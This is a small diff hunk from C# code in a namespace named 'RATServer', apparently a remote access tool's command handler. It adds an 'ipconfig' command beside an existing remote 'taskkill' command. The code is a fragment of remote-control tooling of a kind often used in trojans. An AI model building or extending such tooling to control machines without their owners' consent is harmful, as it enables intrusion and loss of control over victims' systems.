@@ -109,6 +109,9 @@ namespace RATServer
                         case "taskkill":
                             r = Functions.TaskKill(c.Args[0]);
                             break;
+                        case "ipconfig":
+                            r = Functions.IPConfig();
+                            break;
                         default:
                             break;
                     }                 
